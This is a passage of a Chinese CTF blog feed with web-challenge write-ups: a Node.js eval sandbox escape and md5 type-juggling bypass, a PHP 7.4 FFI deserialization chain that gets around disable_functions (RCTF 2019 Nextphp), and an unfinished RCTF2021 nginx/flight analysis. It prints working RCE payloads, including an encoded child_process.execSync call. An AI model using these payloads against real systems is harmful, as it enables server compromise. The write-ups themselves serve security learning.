    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token function">render</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span>
app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/source'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    res<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'text/javascript;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./index.js'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    res<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>admin <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>admin <span class="token operator">||</span> <span class="token number">0</span><span class="token punctuation">;</span>
    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token function">render</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>results <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>results <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Start listening'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>有两层限制，第一层是<code>first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])</code>，需要提交两个长度一致但不全等的数据拼接一个key之后算出的md5完全相等。</p>
<p>其次就是过一个超级正则之后进入eval函数，可以用正则可视化看一下规则，用眼睛看有一点点累<br>正则规则是允许<code>()+\-*/&amp;|^%&lt;&gt;=,?:</code>这么大一串符号，允许Math.xxxx这样子的任意形式函数调用，以及浮点数科学计数法的数字表示形式，还有空格</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="md5绕过"><a href="#md5绕过" class="headerlink" title="md5绕过"></a>md5绕过</h3><p>一层层来吧，md5这个超级判断使用了加法把数据和key相加，很有可能就是利用弱类型，而源码中的<code>app.use(bodyParser.json());</code>指明了允许在Content-Type是application&#x2F;json时，可以以json格式解析数据，这样子就能构造出两个数据类型不一致的变量了，提交{“e”: “1+1”, first”: “1”, “second”: [1]}，一个是字符串一个是数组，和字符串做加法的时候数组转换成字符串，就得到了两个一样的值进行比较，成功绕过</p>
<p>一开始提交了一个数字1和一个字符串1，绕不过去，后来试了一下发现原来是数字类型没有length属性，所以<code>first.length === second.length</code>这个条件绕不过去</p>
<h3 id="正则执行命令"><a href="#正则执行命令" class="headerlink" title="正则执行命令"></a>正则执行命令</h3><p>真不会，看的神仙payload，缩进一下</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token punctuation">(</span>Math<span class="token operator">=</span><span class="token operator">></span>
        <span class="token punctuation">(</span>Math<span class="token operator">=</span>Math<span class="token punctuation">.</span>constructor<span class="token punctuation">,</span>
                Math<span class="token punctuation">.</span>x<span class="token operator">=</span>Math<span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span>
                    Math<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span>
                        <span class="token number">99</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">77</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span>
                        <span class="token number">46</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">113</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>
                        <span class="token number">95</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span>
                        <span class="token number">121</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">(</span>Math<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>
</code></pre>
<p>需要本地测试几下看看都发生了什么<br>最里层的Math.fromCharCode返回值是”return process.mainModule.require(‘child_process’).execSync(‘cat &#x2F;flag’).toString()”</p>
<p>那么原payload变为</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token punctuation">(</span>Math<span class="token operator">=</span><span class="token operator">></span>
        <span class="token punctuation">(</span>Math<span class="token operator">=</span>Math<span class="token punctuation">.</span>constructor<span class="token punctuation">,</span>
                Math<span class="token punctuation">.</span>x<span class="token operator">=</span>Math<span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token string">"return process.mainModule.require('child_process').execSync('cat /flag').toString()"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">(</span>Math<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>
</code></pre>
<p>最外层是一个箭头函数和自调用函数，因为题目的限制，通过传入Math+1获取到了一个字符串对象，然后访问这个字符串对象的constructor，获取string类的原型，再获取string类原型的原型，得到了function类原型，然后用”return process.mainModule.require(‘child_process’).execSync(‘cat &#x2F;flag’).toString()”创建出了一个匿名函数，并且也进行了自调用，完成了命令执行<br>同时也解释了为什么之前可以用Math去调用String的fromCharCode方法，因为原型的获取，我们获得了String和Function两个原型，String将数字转换为字符串，而Function将我们获得的字符串作为函数执行，再通过自调用函数这个语法，将函数创建之后即调用，完成了命令执行</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">></span>a <span class="token operator">=</span> Math <span class="token operator">+</span> <span class="token string">"1"</span>
<span class="token operator">&lt;</span><span class="token string">"[object Math]1"</span>
<span class="token operator">></span><span class="token keyword">typeof</span> a
<span class="token operator">&lt;</span><span class="token string">"string"</span>
<span class="token operator">></span>a<span class="token punctuation">.</span>constructor
<span class="token operator">&lt;</span>ƒ <span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">[</span>native code<span class="token punctuation">]</span> <span class="token punctuation">}</span>
<span class="token operator">></span>a<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>constructor
<span class="token operator">&lt;</span>ƒ <span class="token function">Function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">[</span>native code<span class="token punctuation">]</span> <span class="token punctuation">}</span>
</code></pre>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>讲的不一定清楚，可以参考一下这个wp<br><a href="http://wh1sper.cn/npuctf2020_wp/">http://wh1sper.cn/npuctf2020_wp/</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>[RCTF 2019]Nextphp</title>
    <url>/%5BRCTF%202019%5DNextphp.html</url>
    <content><![CDATA[<h1 id="RCTF-2019-Nextphp"><a href="#RCTF-2019-Nextphp" class="headerlink" title="[RCTF 2019]Nextphp"></a>[RCTF 2019]Nextphp</h1><p>全新的知识，PHP7.4中的全新玩法<br>上来直接给一个shell，直接执行phpinfo看一眼，open_basedir写上了，disable_function超级过滤，把平常用的mail和unsetenv都给禁了，常用的bypass_disable_function via RD_PRELOAD都不能用了，得寻找新的突破口</p>
<p>可以先var_dump(scandir(‘.’));看一眼有没有其他的可利用文件，发现一个preload.php，里面写了一个类</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token string">'ret'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">null</span><span class="token punctuation">,</span>
        <span class="token string">'func'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'print_r'</span><span class="token punctuation">,</span>
        <span class="token string">'arg'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'1'</span>
    <span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">run</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string">'ret'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string">'arg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">array</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__unserialize</span><span class="token punctuation">(</span><span class="token keyword">array</span> <span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">serialize</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span> <span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__set</span> <span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>Exception</span><span class="token punctuation">(</span><span class="token string">'No implemented'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>Exception</span><span class="token punctuation">(</span><span class="token string">'No implemented'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>说实话我是没看懂这个类能怎么利用的，虽然我印象中析构函数会将工作目录切换到根目录，但是这里显然也没有析构函数，而尝试了一下用这个类的反序列化去执行命令，显然还是PHP函数，无法绕过disable_function</p>
<h2 id="PHP7-4的新特性"><a href="#PHP7-4的新特性" class="headerlink" title="PHP7.4的新特性"></a>PHP7.4的新特性</h2><p>PHP7.4提出了几个新的特性，在这里就使用上了几个<br>第一个就是预加载，可以在php.ini中设置opcache.preload项，将指定文件在服务启动时加载到内存，并永久可用（我的理解就是约等于给每个文件开头加上了一句include），查看phpinfo中的opcache.preload项，发现果然将preload.php作为预加载项，可以在index.php中直接利用</p>
<p>第二个是提出了魔术方法__serialize和__unserialize来自定义对象的序列化与反序列化<br>不过以前也有__sleep()和__wakeup决定对象在序列化和反序列化时的行为，不知道这两个新的有什么区别</p>
<p>第三个则是FFI(Foreign Function Interface)外部函数接口，允许调用C代码，这样子是不是就跳出了PHP的限制，突破了disable_function?!<br>查phpinfo，FFI是enabled，可用，开始利用<br>使用方法大概为$ffi&#x3D;FFI::cdef(“int system(char* command)”, “libc.so.6”)，第一个参数为在C代码中的函数原型，第二个参数为指定的共享库，但在不指定第二个参数的情况下，会在默认路径下进行搜索，一般来说也能找到想要的函数<br>显然，这里的run()函数就可以将ret变为一个外部函数接口，我们再通过ret调用系统命令，完成RCE</p>
<p>这里还把构造函数写成了一个抛出错误，不过没影响，之间注释掉就可以了，由于成员变量是protected的，所以序列化出来的payload用url编码一下，不然之间复制不可见字符会变成空格用不了</p>
<p>把构造函数注释一下，然后把data改一下</p>
<pre class=" language-php"><code class="language-php">    <span class="token keyword">protected</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token string">'ret'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">null</span><span class="token punctuation">,</span>
        <span class="token string">'func'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'FFI::cdef'</span><span class="token punctuation">,</span>
        <span class="token string">'arg'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'int system(char* command);'</span>
    <span class="token punctuation">]</span><span class="token punctuation">;</span>
</code></pre>
<p>反序列化得到payload，最后访问index.php?a&#x3D;serialize(payload)-&gt;__get(‘ret’)-&gt;system(cmd);即可获取flag<br>不过这里system的执行返回值是int，拿不到回显，可以尝试curl外带，不过试了一下感觉靶机可能连不到外网，又懒得开小号开内网靶机，试了一下把flag从根目录直接写到当前目录下，访问一下，也可行</p>
<p>至今不知道那个序列化和反序列化的魔法方法有什么用（不过反序列化的时候应该调用了__unserialize这样子ret才被赋值为一个FFI了</p>
<p>看神仙WP的时候提到了既然能直接用FFI，为什么不用shell直接调用，还多走的一步反序列化，神仙在WP中也查了文档做了解释，ffi.enable&#x3D;preload为其默认值，即启用了FFI，但只在命令行模式下和preload文件中可用，所以要用preload文件中的反序列化来完成利用，而将ffi.enable&#x3D;true时，则可在任意页面使用</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>神仙的WP<br><a href="https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp">https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>FFI</tag>
        <tag>bypass_disable_function</tag>
      </tags>
  </entry>
  <entry>
    <title>[RCTF2021]挨打记录</title>
    <url>/%5BRCTF2021%5D%E6%8C%A8%E6%89%93%E8%AE%B0%E5%BD%95.html</url>
    <content><![CDATA[<h1 id="RCTF2021-挨打记录"><a href="#RCTF2021-挨打记录" class="headerlink" title="[RCTF2021]挨打记录"></a>[RCTF2021]挨打记录</h1><p>RCTF2021 web wp，太难了，都不会，纯挨打，null的神仙全部ak，太牛逼了，等神仙的wp ing</p>
<h2 id="Easyphp"><a href="#Easyphp" class="headerlink" title="Easyphp"></a>Easyphp</h2><p>这个题我来的时候就被队里另一个师傅秒了，后来复现的时候发现并没有想象中那么简单，那个师傅也算是误打误撞的猜出了结果，但并没有特别清晰的认识到这个题的原理</p>
<p>赛后认真再看了一下</p>
<h3 id="nginx-conf"><a href="#nginx-conf" class="headerlink" title="nginx.conf"></a>nginx.conf</h3><p>这个题对外是一个Nginx，反代内网的PHP，PHP用的一个叫flight的框架。先看nginx.conf</p>
<pre class=" language-nginx"><code class="language-nginx"><span class="token keyword">server</span> <span class="token punctuation">{</span>
    <span class="token keyword">listen</span>       <span class="token number">80</span><span class="token punctuation">;</span>
    <span class="token keyword">listen</span>  <span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token number">80</span><span class="token punctuation">;</span>
    <span class="token keyword">server_name</span>  localhost<span class="token punctuation">;</span>

    <span class="token keyword">root</span>   <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token punctuation">;</span>
    <span class="token keyword">location</span> <span class="token operator">/</span>admin <span class="token punctuation">{</span>
        <span class="token keyword">allow</span> <span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">;</span>
        <span class="token keyword">deny</span> all<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">location</span> <span class="token operator">/</span> <span class="token punctuation">{</span>
        <span class="token keyword">index</span>  <span class="token keyword">index</span><span class="token punctuation">.</span>php<span class="token punctuation">;</span>
        <span class="token keyword">try_files</span> <span class="token variable">$uri</span> @phpfpm<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token comment" spellcheck="true"># pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span>
    <span class="token comment" spellcheck="true">#</span>
    <span class="token keyword">location</span> @phpfpm <span class="token punctuation">{</span>
        <span class="token keyword">include</span>        fastcgi_params<span class="token punctuation">;</span>
        <span class="token keyword">fastcgi_split_path_info</span> <span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token operator">?</span>\<span class="token punctuation">.</span>php<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">)</span>$<span class="token punctuation">;</span>
        <span class="token keyword">fastcgi_pass</span>   php<span class="token punctuation">:</span><span class="token number">9000</span><span class="token punctuation">;</span>
        <span class="token keyword">fastcgi_index</span>  <span class="token keyword">index</span><span class="token punctuation">.</span>php<span class="token punctuation">;</span>
        <span class="token keyword">fastcgi_param</span>  SCRIPT_FILENAME  <span class="token variable">$document_root</span><span class="token operator">/</span><span class="token keyword">index</span><span class="token punctuation">.</span>php<span class="token punctuation">;</span>
        <span class="token keyword">fastcgi_param</span>  REQUEST_URI  <span class="token variable">$uri</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>对Nginx的配置文件不是很熟练，阅读起来百度了好久。。。<br>location这个指令接受各种语法，这里就两项<code>/admin</code>和<code>/</code>，这种类型就是简单的前缀匹配，所以所有以<code>/admin</code>打头的请求只要不是localhost发起的请求，一律403。而<code>/</code>则用来处理剩下的所有请求</p>
<p>index就是默认页面，请求如果啥都不带就返回index.php<br>这里还有一个<code>try_files</code>语句，请求的时候就去这里尝试，先直接访问请求的$uri文件在本机是否存在，不然就把这个请求转到下面定义的<code>phpfpm</code>处理，而这个nginx服务器上啥都没配，所以稳定丢给内网fpm<br>fastcgi给后端传了两个主要参数，一个SCRIPT_FILENAME，让fpm执行index.php，一个REQUEST_URI，用的是nginx自己解析的这个名为<code>$uri</code>的变量</p>
<h3 id="flight框架"><a href="#flight框架" class="headerlink" title="flight框架"></a>flight框架</h3><p>先看漏洞点在哪，已删减掉部分无用代码</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">isdanger</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isdanger</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">isdanger</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span><span class="token string">"../"</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$app</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">before</span><span class="token punctuation">(</span><span class="token string">"start"</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">,</span><span class="token variable">$_COOKIE</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isdanger</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"go away hack"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$app</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">route</span><span class="token punctuation">(</span><span class="token string">'/*'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">global</span> <span class="token variable">$app</span><span class="token punctuation">;</span>
    <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$app</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$app</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"head"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"head_content"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span><span class="token punctuation">,</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
